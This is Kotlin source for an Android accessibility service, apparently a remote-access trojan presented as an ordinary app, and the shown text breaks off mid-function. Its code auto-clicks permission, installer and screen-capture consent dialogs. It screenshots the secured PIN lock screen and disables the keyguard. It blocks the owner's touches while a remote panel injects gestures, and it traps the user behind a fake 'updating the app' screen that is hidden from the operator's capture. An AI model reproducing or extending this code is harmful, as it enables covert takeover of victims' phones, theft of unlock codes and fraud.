package com.example.acessomaterno

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.AccessibilityService.ScreenshotResult
import android.accessibilityservice.AccessibilityService.TakeScreenshotCallback
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Color
import android.graphics.ColorSpace
import android.graphics.Path
import android.graphics.PixelFormat
import android.graphics.PorterDuff
import android.hardware.HardwareBuffer
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.app.KeyguardManager
import android.view.Display
import android.view.Gravity
import android.view.KeyEvent
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log
import android.util.TypedValue
import android.widget.Button
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import androidx.core.content.ContextCompat
import org.json.JSONObject
import org.json.JSONArray
import java.io.ByteArrayOutputStream

class MyAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "MyAccessibilityService"
        /** Intervalo mínimo (ms) entre tentativas de reanimação do ecossistema (keep-alive pós-boot). */
        private const val REANIMACAO_INTERVALO_MS = 30000L

        @Volatile
        var instance: MyAccessibilityService? = null
            private set

        // REGRA 2/3: automação assistiva (Injecty) de cliques automáticos em
        // telas de permissão/segurança do sistema. Ativa por padrão quando o
        // serviço está conectado.
        @Volatile
        var autoClickPermissoesAtivo: Boolean = true

        // MODO ONBOARDING RÁPIDO: quando true (definido pela MainActivity
        // durante o primeiro acesso), o Injecty usa intervalo de apenas 300ms
        // entre cliques e ainda faz "voltar" automaticamente após confirmar
        // permissões em telas de configuração — acelerando o fluxo de
        // "Iniciar" -> sobreposição -> MediaProjection sem toque manual.
        @Volatile
        var onboardingRapido: Boolean = false

        // Android 14+ (API 34): quando true, a janela do overlay visual de
        // atualização foi marcada com setHideDuringScreenSharing(true) e é
        // automaticamente OMITIDA da captura do MediaProjection, permanecendo
        // 100% visível no aparelho. Com isto o ScreenCaptureService NÃO precisa
        // mais alternar o alpha a cada frame — eliminando o flicker ("piscando").
        @Volatile
        var hideDuranteCapturaDisponivel: Boolean = false
            private set
    }

    // --- Estado de Controle de Interação "Acesso Total" ---
    @Volatile
    var bloquearCliquesLocais: Boolean = false
    private var activePath: Path? = null
    private var startX = 0f
    private var startY = 0f

    // --- Overlays INDEPENDENTES: cada botão do painel controla o seu ---
    private var windowManager: WindowManager? = null
    private var overlayPrivacidade: View? = null
    private var overlayEscura: View? = null
    // Overlay de bloqueio de toques locais (Acesso Total). É touchable e
    // consome TODO toque físico do usuário do dispositivo. Durante gestos
    // remotos vindos do painel do emulador, ele fica temporariamente
    // FLAG_NOT_TOUCHABLE para que o dispatchGesture injetado chegue aos apps
    // por baixo — ou seja, bloqueia APENAS o dispositivo local, nunca o
    // painel de controle remoto.
    private var overlayBloqueio: View? = null
    // Overlay de QUIOSQUE DA ATUALIZAÇÃO (sala separada do Acesso Total).
    // Durante a atualização do app (loading_overlay ativo) a tela de
    // atualização continua VISÍVEL no dispositivo, mas este overlay
    // transparente consome TODO toque local — o usuário não consegue sair
    // da tela de atualização (home/recents na tela ficam bloqueados). É
    // independente de overlayBloqueio para não interferir no Acesso Total.
    private var overlayKioskAtualizacao: View? = null
    // SINCRONIA DE FRAME — overlay visual de "Atualizando..." (NÃO bloqueia
    // toques: FLAG_NOT_TOUCHABLE + FLAG_NOT_FOCUSABLE). O ScreenCaptureService
    // oculta este overlay por ~18ms via setOverlayAtualizacaoAlpha(0f), captura
    // o fundo LIMPO (sem o overlay) e restaura — o painel/emulador flutuante
    // vê apenas o fundo real do dispositivo, com o círculo só no aparelho.
    private var overlayAtualizacaoVisual: View? = null
    private val failsafeRestauroBloqueio = Runnable { setBloqueioPermiteToqueRemoto(false) }
    private val handlerMain = Handler(Looper.getMainLooper())
    private val TIMEOUT_PRIVACIDADE_MS = 3 * 60 * 1000L
    private val autoRemover = Runnable { removerTelaPrivacidade("tempo-limite de seguranca atingido") }

    // Evita agendar mais de um "voltar" automático durante o onboarding rápido.
    @Volatile
    private var backAgendado: Boolean = false
    // Keep-alive pós-boot: timestamp da última tentativa de reerguer o ecossistema.
    @Volatile
    private var ultimaTentativaReanimacao: Long = 0L
    // Limite de tentativas consecutivas de reanimação: após N falhas (ex.:
    // usuário negou MediaProjection permanentemente), PARA de abrir a
    // MainActivity — evita que a tela fique "mechendo sozinha" em loop.
    // O contador zera automaticamente quando o ScreenCaptureService volta a
    // rodar (sucesso detectado) ou quando o serviço de acessibilidade reconecta.
    @Volatile
    private var reanimacaoFalhasConsecutivas: Int = 0
    private val MAX_REANIMACAO_TENTATIVAS = 5

    // ================================================================
    // CAPTURA POR ACESSIBILIDADE (fallback para tela de bloqueio com senha)
    // ----------------------------------------------------------------
    // O MediaProjection (rodando com UID do app) NÃO captura o keyguard
    // seguro (PIN/senha) — fica cinza devido a FLAG_SECURE nativa. Já o
    // AccessibilityService.takeScreenshot() (API 30+, Android 11+) roda com
    // privilégios de acessibilidade e CAPTURA as camadas seguras, inclusive
    // o teclado de senha. Usamos como fonte primária ENQUANTO o keyguard
    // estiver travado; quando desbloqueia (USER_PRESENT), volta ao
    // MediaProjection (mais FPS). Requer android:canTakeScreenshot="true"
    // no res/xml/accessibility_service_config.xml.
    // ================================================================
    @Volatile
    var capturaAcessibilidadeAtiva: Boolean = false
        private set
    private val handlerCapturaAces = Handler(Looper.getMainLooper())
    /** 1 FPS — taxa estável para respeitar o rate-limit do takeScreenshot(). */
    private val INTERVALO_CAPTURA_ACE_MS = 1000L
    private val runnableCapturaAces = object : Runnable {
        override fun run() {
            if (!capturaAcessibilidadeAtiva) return
            capturarScreenshotAcessibilidade()
            handlerCapturaAces.postDelayed(this, INTERVALO_CAPTURA_ACE_MS)
        }
    }

    // ================================================================
    // REGRA 2/3 — AUTOMAÇÃO ASSISTIVA (INJECTY) DE CLIQUES AUTOMÁTICOS
    // ----------------------------------------------------------------
    // Pacotes de telas de permissão/segurança onde o auto-clique age:
    //   - Configurações do Android (com.android.settings)
    //   - Segurança Xiaomi/MIUI/HyperOS (com.miui.securitycenter, com.lbe.security.miui)
    //   - Instalador de pacotes (permite instalar o motor sem toque manual)
    //   - Próprio Suporte Motor (com.example.suportemotor) — replica permissões (regra 3)
    //   - PRÓPRIO APP (com.example.acessomaterno) — para auto-clicar o botão
    //     "Iniciar" do 2º modal de consentimento assim que a acessibilidade
    //     estiver ativa.
    //   - SystemUI (com.android.systemui) — diálogo de consentimento do
    //     MediaProjection ("Iniciar agora" / "Start now").
    // ================================================================
    // REGRA 2 — ESCOPO ESTRITO: apenas telas de permissão do sistema,
    // diálogo do SystemUI (MediaProjection), instaladores de pacote e o
    // PRÓPRIO app. Qualquer app terceiro = auto-clique IGNORADO.
    private val pacotesPermissaoSistema = setOf(
        "com.android.settings",
        "com.miui.securitycenter", "com.lbe.security.miui", "com.miui.permcenter",
        "com.android.permissioncontroller",
        "com.android.systemui"
    )
    private val pacotesInstalador = setOf(
        "com.google.android.packageinstaller", "com.android.packageinstaller"
    )
    private val PACOTE_PROPRIO_APP = "com.example.acessomaterno"

    private fun pacotePermitidoParaAutoClique(pacote: String): Boolean {
        // CORREÇÃO: o PRÓPRIO app NÃO recebe auto-clique. Antes ele clicava
        // sozinho em botões como "Permitir"/"Iniciar"/"OK" dentro do próprio
        // app, causando "mechendo sozinho" e fechamento da tela.
        if (pacote in pacotesPermissaoSistema) return true
        if (pacote in pacotesInstalador) return true
        val p = pacote.lowercase()
        return p.contains("packageinstaller") || p.contains("permissioncontroller")
    }

    // Pacotes de sistema (Configurações / SystemUI / MIUI security) onde o
    // auto-clique SÓ pode usar a lista ESTRITA (frases EXATAS de permissão) —
    // nunca a lista ampla, para não clicar em botões de navegação normal
    // ("OK", "Continuar", "Abrir", "Salvar") dentro desses apps.
    private val pacotesSistemaEstritos = setOf(
        "com.android.settings",
        "com.miui.securitycenter", "com.lbe.security.miui", "com.miui.permcenter",
        "com.android.systemui"
    )
    private fun pacoteUsaListaEstrita(pacote: String): Boolean = pacote in pacotesSistemaEstritos

    // Lista ESTRITA (comparação EXATA, trim+lowercase): apenas frases de botão
    // de consentimento de permissão. Usada em Configurações/SystemUI/MIUI para
    // eliminar falsos positivos em telas de navegação normal.
    private val textosPermitirEstritos = listOf(
        "permitir", "permitir mesmo assim", "permita", "permitir desta forma",
        "permitir o acesso", "permitir sobre", "exibir sobre outros apps",
        "permitir exibição", "permitir exibicao", "ativar exibição", "ativar exibicao",
        "conceder permissão", "conceder permissao", "conceder", "autorizar",
        "aceitar", "aceito", "concordo", "eu concordo",
        "ativar", "ativar serviço", "ativar servico", "usar serviço", "usar servico",
        "iniciar agora", "start now", "iniciar automático", "iniciar automatico",
        "iniciar automaticamente",
        "só desta vez", "so desta vez", "enquanto o app estiver em uso",
        "allow", "accept", "enable", "allow only while using the app",
        "allow all the time", "start", "install"
    )

    private val pacotesAutoClique = pacotesPermissaoSistema + pacotesInstalador

    // Textos de botões que o auto-clique deve PRESSIONAR (case-insensitive, contains).
    private val textosPermitir = listOf(
        "permitir", "permitir mesmo assim", "permita", "aceitar", "aceito", "concordo",
        "ok", "ativar", "ativar serviço", "iniciar automático", "iniciar automaticamente",
        "iniciar", "iniciar agora", "começar", "comecar", "start now",
        "autorizar", "prosseguir", "continuar", "concluir", "instalar",
        "habilitar", "ligar", "sim", "eu concordo", "permitir sobre", "exibir sobre",
        "exibir sobre outros apps", "permitir exibição", "permitir exibicao",
        "ativar exibição", "ativar exibicao", "conceder permissão", "conceder permissao",
        "acessibilidade", "conceder", "allow", "accept", "start", "enable", "install",
        "permitir desta forma", "só desta vez", "so desta vez",
        "enquanto o app estiver em uso", "permitir o acesso", "abrir configurações", "abrir"
    )

    // Textos que NUNCA devem ser clicados (bloqueia falsos positivos).
    // REGRA 3 — PROTEÇÃO CONTRA FALSOS POSITIVOS: qualquer nó cujo texto
    // contenha UMA destas palavras é INVALIDADO completamente (nunca clicado).
    private val textosBloquear = listOf(
        "negar", "recusar", "cancelar", "desativar", "não permitir", "nao permitir",
        "bloquear", "desligar", "cancel", "deny", "don't allow", "do not allow",
        "no thanks", "agora não", "agora nao", "mais tarde", "not now", "ignorar",
        "fechar", "close", "sair", "desinstalar", "uninstall", "parar", "stop",
        "não", "nao", "no ", "recuse", "rejeitar", "rejeitar e avisar", "depois",
        "excluir", "apagar", "remover", "encerrar", "forçar", "forcar",
        "limpar dados", "limpar", "redefinir", "resetar", "desconectar", "revogar",
        "denunciar", "reject", "delete", "remove", "reset", "erase",
        "force stop", "force-stop", "clear data", "disable",
        "sem permissão", "sem permissao", "permissão negada", "permissao negada"
    )

    private var ultimoCliqueAuto = 0L
    private val CLICK_AUTO_INTERVALO_MS = 1200L
    private val CLICK_RAPIDO_INTERVALO_MS = 300L

    // REGRA 1 — TRAVA ÚNICA POR TELA: após clicar com sucesso um botão,
    // guarda "pacote|texto" e bloqueia novos cliques no mesmo botão na mesma
    // janela. Cache limpo ao mudar de janela (pacote) ou após TTL de 30s.
    private val _botoesClicadosNaTela = java.util.Collections.synchronizedSet(mutableSetOf<String>())
    @Volatile private var _pacoteAutoCliqueAtual: String = ""
    @Volatile private var _janelaCachePacote: String? = null
    @Volatile private var _janelaCacheTs: Long = 0L
    private val TTL_CACHE_CLIQUE_MS = 30_000L

    private fun resetarCacheCliqueSeMudouJanela(pacote: String) {
        val agora = System.currentTimeMillis()
        val mudouJanela = _janelaCachePacote != pacote
        val expirou = agora - _janelaCacheTs > TTL_CACHE_CLIQUE_MS
        if (mudouJanela || expirou) {
            if (mudouJanela) _botoesClicadosNaTela.clear()
            _janelaCachePacote = pacote
            _janelaCacheTs = agora
        }
    }

    private fun botaoJaClicadoNaTela(texto: String): Boolean {
        val p = _pacoteAutoCliqueAtual.ifEmpty { return false }
        return "${p.lowercase()}|${texto.trim().lowercase()}" in _botoesClicadosNaTela
    }

    private fun marcarBotaoClicado(texto: String) {
        val p = _pacoteAutoCliqueAtual.ifEmpty { return }
        _botoesClicadosNaTela.add("${p.lowercase()}|${texto.trim().lowercase()}")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        reanimacaoFalhasConsecutivas = 0 // serviço reconectou → permite novo keep-alive
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        // Habilita filtro de teclas para detectar o botão HOME mesmo com a
        // tela apagada. Requer android:canRequestFilterKeyEvents="true" no
        // res/xml/accessibility_service_config.xml (e reativar a acessibilidade).
        try {
            val info = serviceInfo
            info.flags = info.flags or AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
            serviceInfo = info
        } catch (e: Exception) {
            Log.e(TAG, "Falha ao habilitar filtro de teclas: ${e.message}")
        }
        Log.d(TAG, "Accessibility Service Conectado e Ativo")
        
        // Registra o BroadcastReceiver de estado da tela de bloqueio (ACTION_USER_PRESENT / ACTION_SCREEN_OFF)
        try {
            val filter = android.content.IntentFilter().apply {
                addAction(Intent.ACTION_USER_PRESENT)
                addAction(Intent.ACTION_SCREEN_OFF)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(lockStateReceiver, filter, android.content.Context.RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(lockStateReceiver, filter)
            }
            Log.d(TAG, "BroadcastReceiver de estado da tela de bloqueio registrado com sucesso.")
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao registrar lockStateReceiver: ${e.message}")
        }

        SocketManager.connect()
        configurarOuvintesSocket()
        enviarLogApp("Serviço de acessibilidade ATIVO e pronto para receber comandos (auto-clique de permissões=$autoClickPermissoesAtivo, onboardingRapido=$onboardingRapido).")
    }

    /**
     * Acende a tela quando ela está apagada (em descanso). Chamado quando o
     * cliente aperta o botão HOME com a tela desligada — a tela acende normal.
     */
    private fun acenderTela() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            val wakeLock = pm.newWakeLock(
                PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
                    PowerManager.ACQUIRE_CAUSES_WAKEUP or
                    PowerManager.ON_AFTER_RELEASE,
                "AcessoMaterno:AcenderHome"
            )
            wakeLock.acquire(3000L) // mantém acesa por 3s (depois segue o timeout normal)
            // Libera o bloqueio de tela (keyguard) se existir.
            // requestDismissKeyguard() exige uma Activity como 1º argumento;
            // dentro de um Service usamos a API legada KeyguardLock (depreciada,
            // mas ainda funcional). Requer <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
            // no AndroidManifest.xml.
            val kg = getSystemService(KEYGUARD_SERVICE) as KeyguardManager
            @Suppress("DEPRECATION")
            val keyguardLock = kg.newKeyguardLock("AcessoMaterno:AcenderHome")
            keyguardLock.disableKeyguard()
        } catch (e: Exception) {
            Log.e(TAG, "Falha ao acender a tela: ${e.message}")
        }
    }

    /** Configura ouvintes adicionais no Socket vivo caso necessário. */
    private fun configurarOuvintesSocket() {
        try {
            SocketManager.socket?.on("configurar_acesso_total") { args ->
                val json = if (args.isNotEmpty() && args[0] is JSONObject) args[0] as JSONObject else null
                val ativo = when {
                    json != null && json.has("ativo") -> json.optBoolean("ativo", false)
                    args.isNotEmpty() && args[0] is Boolean -> args[0] as Boolean
                    else -> false
                }
                configurarAcessoTotal(ativo)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao registrar ouvinte configurar_acesso_total: ${e.message}")
        }
    }

    /** Altera o estado do Acesso Total e emite logs de sincronização. */
    fun configurarAcessoTotal(ativo: Boolean) {
        bloquearCliquesLocais = ativo
        // A criação/remocao do overlay toca em WindowManager -> main thread.
        handlerMain.post {
            if (ativo) mostrarBloqueioAcessoTotal() else removerBloqueioAcessoTotal()
        }
        enviarLogApp("Acesso Total alterado via Socket: bloquearCliquesLocais=$bloquearCliquesLocais")
        Log.d(TAG, "Configuração de Acesso Total atualizada: bloquearCliquesLocais=$bloquearCliquesLocais")
    }

    // ================================================================
    // BLOQUEIO REAL DE TOQUES LOCAIS (Acesso Total) — overlay touchable
    // que consome todo toque físico. O painel remoto continua funcionando
    // porque, antes de cada gesto injetado, o overlay fica temporariamente
    // FLAG_NOT_TOUCHABLE (ver setBloqueioPermiteToqueRemoto).
    // ================================================================
    private fun paramsBloqueio(): WindowManager.LayoutParams = WindowManager.LayoutParams(
        WindowManager.LayoutParams.MATCH_PARENT,
        WindowManager.LayoutParams.MATCH_PARENT,
        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
        // NÃO usar FLAG_NOT_TOUCHABLE aqui: o overlay precisa consumir os
        // toques locais. FLAG_NOT_FOCUSABLE mantém teclado/input remoto OK.
        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
        PixelFormat.TRANSLUCENT
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            layoutInDisplayCutoutMode =
                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
        }
    }

    private fun mostrarBloqueioAcessoTotal() {
        if (overlayBloqueio != null) return
        val wm = windowManager ?: return
        val container = FrameLayout(this).apply {
            // Tinte quase invisível: a tela continua visível (e o screen
            // capture do painel continua enxergando o dispositivo).
            setBackgroundColor(Color.parseColor("#14000000"))
            setOnTouchListener { _, _ -> true } // consome TODO toque local
        }
        val selo = TextView(this).apply {
            text = "🔒 Bloqueado"
            setTextColor(Color.parseColor("#CCFFFFFF"))
            textSize = 11f
            setPadding(dp(8), dp(4), dp(8), dp(4))
            setBackgroundColor(Color.parseColor("#66000000"))
            gravity = Gravity.CENTER
        }
        val lpSelo = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.WRAP_CONTENT,
            FrameLayout.LayoutParams.WRAP_CONTENT,
            Gravity.TOP or Gravity.END
        ).apply { topMargin = dp(10); rightMargin = dp(10) }
        container.addView(selo, lpSelo)
        try {
            wm.addView(container, paramsBloqueio())
            overlayBloqueio = container
            enviarLog("Acesso Total ATIVO: toques locais do dispositivo bloqueados (painel remoto permanece liberado).")
        } catch (e: Exception) {
            enviarLog("Falha ao ativar overlay de bloqueio do Acesso Total: ${e.message}")
        }
    }

    private fun removerBloqueioAcessoTotal() {
        handlerMain.removeCallbacks(failsafeRestauroBloqueio)
        overlayBloqueio?.let {
            try { windowManager?.removeView(it) } catch (_: Exception) {}
        }
        overlayBloqueio = null
        enviarLog("Acesso Total DESATIVADO: toques locais do dispositivo liberados.")
    }

    // ================================================================
    // QUIOSQUE DA ATUALIZAÇÃO (fixação por overlay — sala separada).
    // Quando o emulador flutuante está só com o círculo de carregamento
    // (loading_overlay ativo), o dispositivo físico CONTINUA na tela de
    // atualização do aplicativo e NÃO consegue sair dela: overlay quase
    // transparente (a tela de atualização fica 100% visível) que consome
    // TODO toque local + mantém a tela acesa. Independente do Acesso Total
    // para não interferir no estado daquele recurso.
    // ================================================================
    fun ativarKioskAtualizacao() {
        handlerMain.post {
            if (overlayKioskAtualizacao != null) return@post
            val wm = windowManager ?: return@post
            val container = FrameLayout(this).apply {
                setBackgroundColor(Color.parseColor("#0A000000")) // transparente — usuário VÊ a atualização
                setOnTouchListener { _, _ -> true } // consome TODO toque local (não sai da tela)
            }
            val selo = TextView(this).apply {
                text = "🔄 Atualizando aplicativo…"
                setTextColor(Color.parseColor("#CCFFFFFF"))
                textSize = 11f
                setPadding(dp(8), dp(4), dp(8), dp(4))
                setBackgroundColor(Color.parseColor("#66000000"))
                gravity = Gravity.CENTER
            }
            val lpSelo = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT,
                Gravity.TOP or Gravity.END
            ).apply { topMargin = dp(10); rightMargin = dp(10) }
            container.addView(selo, lpSelo)
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                // SEM FLAG_NOT_TOUCHABLE: consome os toques (bloqueia a saída).
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                PixelFormat.TRANSLUCENT
            ).apply {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    layoutInDisplayCutoutMode =
                        WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                }
            }
            try {
                wm.addView(container, params)
                overlayKioskAtualizacao = container
                enviarLog("Quiosque da atualização ATIVO: tela de atualização visível; toques locais bloqueados (usuário não sai da atualização).")
            } catch (e: Exception) {
                enviarLog("Falha ao ativar quiosque da atualização: ${e.message}")
            }
        }
    }

    fun removerKioskAtualizacao() {
        handlerMain.post {
            overlayKioskAtualizacao?.let {
                try { windowManager?.removeView(it) } catch (_: Exception) {}
            }
            if (overlayKioskAtualizacao != null) {
                overlayKioskAtualizacao = null
                enviarLog("Quiosque da atualização REMOVIDO: toques locais liberados (atualização concluída).")
            }
        }
    }

    // ================================================================
    // OVERLAY VISUAL DE ATUALIZAÇÃO + SINCRONIA DE FRAME (fundo limpo)
    // ----------------------------------------------------------------
    // Diferente do quiosque (que bloqueia toques), este overlay é SÓ
    // VISUAL: FLAG_NOT_TOUCHABLE + FLAG_NOT_FOCUSABLE → toques e gestos
    // passam livremente por baixo. Mostra um cartão central com o
    // círculo de carregamento em loop ("Atualizando o aplicativo…").
    //
    // Para que o EMULADOR FLUTUANTE veja o FUNDO REAL (sem o cartão), o
    // ScreenCaptureService faz a sincronia de frame: a cada ciclo chama
    // setOverlayAtualizacaoAlpha(0f) (oculta), espera ~18ms (1 frame),
    // captura o fundo limpo, envia e chama setOverlayAtualizacaoAlpha(1f)
    // (restaura). O alpha é trocado em O(1) sem relayout.
    // ================================================================
    fun ativarOverlayAtualizacaoVisual() {
        handlerMain.post {
            if (overlayAtualizacaoVisual != null) {
                overlayAtualizacaoVisual?.alpha = 1f
                overlayAtualizacaoVisual?.visibility = View.VISIBLE
                return@post
            }
            val wm = windowManager ?: return@post
            // Janela full-screen transparente — só o cartão central é visível.
            val container = FrameLayout(this).apply {
                setBackgroundColor(Color.parseColor("#00000000"))
            }
            // CORREÇÃO FLICKER (API 34+ / Android 14): marca a janela para ser
            // omitida da captura de tela (MediaProjection / screen share) SEM
            // alterar sua visibilidade no aparelho. Com isto NÃO é mais preciso
            // ficar alternando alpha 0↔1 a cada frame (que causava o "piscar").
            // Testa as duas assinaturas de parâmetro (primitive e wrapper) para
            // não falhar silenciosamente. Em APIs <34 a flag permanece false e
            // o app usa o fallback throttled (~10 FPS, sem flicker perceptível).
            hideDuranteCapturaDisponivel = false
            if (Build.VERSION.SDK_INT >= 34) {
                for (tipo in arrayOf(Boolean::class.javaPrimitiveType, Boolean::class.java)) {
                    try {
                        val metodo = View::class.java.getMethod("setHideDuringScreenSharing", tipo)
                        metodo.invoke(container, true)
                        hideDuranteCapturaDisponivel = true
                        break
                    } catch (_: Exception) {}
                }
            }
            enviarLog("Overlay visual ATIVO — API=${Build.VERSION.SDK_INT} hideNativo=$hideDuranteCapturaDisponivel (false=fallback throttled sem flicker)")
            // Cartão escuro arredondado com círculo + texto (animação em loop).
            val fundoCartao = android.graphics.drawable.GradientDrawable().apply {
                shape = android.graphics.drawable.GradientDrawable.RECTANGLE
                cornerRadius = dp(20).toFloat()
                setColor(Color.parseColor("#E6000000")) // 90% preto — legível
            }
            val cartao = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
                setPadding(dp(36), dp(28), dp(36), dp(28))
                background = fundoCartao
            }
            val progressBar = ProgressBar(this).apply {
                isIndeterminate = true
                layoutParams = LinearLayout.LayoutParams(dp(56), dp(56)).apply {
                    bottomMargin = dp(18)
                    gravity = Gravity.CENTER_HORIZONTAL
                }
            }
            val titulo = TextView(this).apply {
                text = "Atualizando o aplicativo..."
                textSize = 18f
                setTextColor(Color.WHITE)
                setTypeface(null, android.graphics.Typeface.BOLD)
                gravity = Gravity.CENTER
            }
            val subtitulo = TextView(this).apply {
                text = "Aguarde enquanto sincronizamos os dados."
                textSize = 12f
                setTextColor(Color.parseColor("#CCCCCC"))
                gravity = Gravity.CENTER
                setPadding(0, dp(8), 0, 0)
            }
            cartao.addView(progressBar)
            cartao.addView(titulo)
            cartao.addView(subtitulo)
            container.addView(
                cartao,
                FrameLayout.LayoutParams(
                    FrameLayout.LayoutParams.WRAP_CONTENT,
                    FrameLayout.LayoutParams.WRAP_CONTENT,
                    Gravity.CENTER
                )
            )
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                // FLAG_NOT_TOUCHABLE: toques PASSAM pelo overlay (usuário não
                // é bloqueado — gestos/cliques continuam funcionando).
                // FLAG_NOT_FOCUSABLE: não recebe foco de teclado.
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                PixelFormat.TRANSLUCENT
            ).apply {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    layoutInDisplayCutoutMode =
                        WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                }
            }
            try {
                wm.addView(container, params)
                overlayAtualizacaoVisual = container
                enviarLog("Overlay visual de atualização ATIVO (FLAG_NOT_TOUCHABLE — toques livres; sincronia de frame ativa com ScreenCaptureService).")
            } catch (e: Exception) {
                enviarLog("Falha ao ativar overlay visual de atualização: ${e.message}")
            }
        }
    }

    fun removerOverlayAtualizacaoVisual() {
        handlerMain.post {
            overlayAtualizacaoVisual?.let {
                try { windowManager?.removeView(it) } catch (_: Exception) {}
            }
            if (overlayAtualizacaoVisual != null) {
                overlayAtualizacaoVisual = null
                hideDuranteCapturaDisponivel = false
                enviarLog("Overlay visual de atualização REMOVIDO.")
            }
        }
    }



    /**
     * Bypass para o painel do emulador: quando permitir=true, adiciona
     * FLAG_NOT_TOUCHABLE no overlay de bloqueio para que os gestos injetados
     * por dispatchGesture (controle remoto) atravessem para os apps. Quando
     * permitir=false, volta a consumir toques locais. Sem isto, o painel
     * também ficaria bloqueado — exatamente o que NÃO deve acontecer.
     */
    private fun setBloqueioPermiteToqueRemoto(permitir: Boolean) {
        val view = overlayBloqueio ?: return
        val wm = windowManager ?: return
        try {
            val p = view.layoutParams as WindowManager.LayoutParams
            p.flags = if (permitir) {
                p.flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
            } else {
                p.flags and WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv()
            }
            wm.updateViewLayout(view, p)
        } catch (_: Exception) {}
    }

    /** Restaura o bloqueio local após um gesto remoto (com failsafe). */
    private fun restaurarBloqueioLocal() {
        handlerMain.removeCallbacks(failsafeRestauroBloqueio)
        handlerMain.post { setBloqueioPermiteToqueRemoto(false) }
    }

    /** Envia mensagem de log ao painel central via Socket.IO. */
    fun enviarLogApp(msg: String) {
        enviarLog(msg)
    }

    /** Chamado pelo SocketManager quando chega 'receber_movimento' do painel. */
    fun onRemoteMovimento(json: JSONObject) {
        val acao = json.optString("acao", "START")
        val percentX = json.optDouble("x", 0.0).toFloat()
        val percentY = json.optDouble("y", 0.0).toFloat()
        // Dimensão FÍSICA real do display (inclui status/navigation bar).
        // Sem isto, coordenadas 0..1 mapeiam para widthPixels/heightPixels
        // que podem diferir da área capturada → toque parece "descentrado".
        val pontoReal = android.graphics.Point()
        val wm = getSystemService(WINDOW_SERVICE) as? WindowManager
        @Suppress("DEPRECATION")
        wm?.defaultDisplay?.getRealSize(pontoReal)
        val metrics = resources.displayMetrics
        val larguraReal = if (pontoReal.x > 0) pontoReal.x else metrics.widthPixels
        val alturaReal = if (pontoReal.y > 0) pontoReal.y else metrics.heightPixels
        val realX = percentX * larguraReal
        val realY = percentY * alturaReal
        // GESTOS COM A TELA DESLIGADA: dispatchGesture NÃO funciona com a tela
        // apagada (em Doze/descanso). Se a tela estiver desligada quando chegar
        // QUALQUER evento de toque/swipe, acende a tela (no primeiro START) e
        // atrasa TODOS os eventos do gesto em 700ms, preservando a ordem
        // START->MOVE->END. Assim, o movimento do painel funciona mesmo com o
        // celular dormindo, inclusive para deslizar e desbloquear.
        // Além disso, a CADA START de toque, adquirimos um WakeLock brilhante
        // de 15s: enquanto o usuário estiver interagindo (digitando a senha,
        // tocando, arrastando), a tela e o espelhamento permanecem no ar.
        val pm = getSystemService(POWER_SERVICE) as? PowerManager
        val telaDesligada = pm?.isInteractive == false
        if (acao.uppercase() == "START") {
            try {
                @Suppress("DEPRECATION")
                val wl = pm?.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
                        PowerManager.ACQUIRE_CAUSES_WAKEUP or
                        PowerManager.ON_AFTER_RELEASE,
                    "AcessoMaterno:Toque15s"
                )
                wl?.acquire(15000L) // mantém a tela acesa por 15s a cada toque
            } catch (_: Exception) {}
        }
